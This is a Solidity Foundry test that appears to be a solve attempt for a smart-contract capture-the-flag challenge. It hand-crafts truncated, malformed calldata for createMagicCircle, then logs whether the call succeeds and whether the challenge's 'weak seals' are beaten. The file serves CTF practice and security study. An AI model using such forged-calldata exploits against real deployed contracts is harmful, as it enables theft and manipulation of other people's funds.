// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import "../src/Challenge.sol";

contract TruncTest is Test {
    Challenge challenge;
    function setUp() public {
        challenge = new Challenge(address(0));
    }

    function test_truncated_300() public {
        bytes32[8] memory encs;
        for (uint i; i < 8; i++) encs[i] = bytes32(uint256(1));
        Spell memory spell = Spell({ name: "CURAGA", enchantments: encs });
        bytes32 masterSeal = keccak256(abi.encode(spell));

        bytes memory rawCall = abi.encodePacked(
            challenge.createMagicCircle.selector,
            uint256(0x40),
            masterSeal,
            uint256(256),
            new bytes(200)
        );
        assertEq(rawCall.length, 300);

        (bool ok,) = address(challenge).call(rawCall);
        emit log_named_string("createMagicCircle ok?", ok ? "YES" : "NO");
        if (ok) {
            emit log_named_uint("mana", challenge.mana());
            // try to solve
            for (uint i; i < 8; i++) {
                bool broken = bytes32(uint256(1)) > challenge.weakSeals(i);
                emit log_named_string("weakSeal beat?", broken ? "YES" : "NO");
            }
        }
    }
}
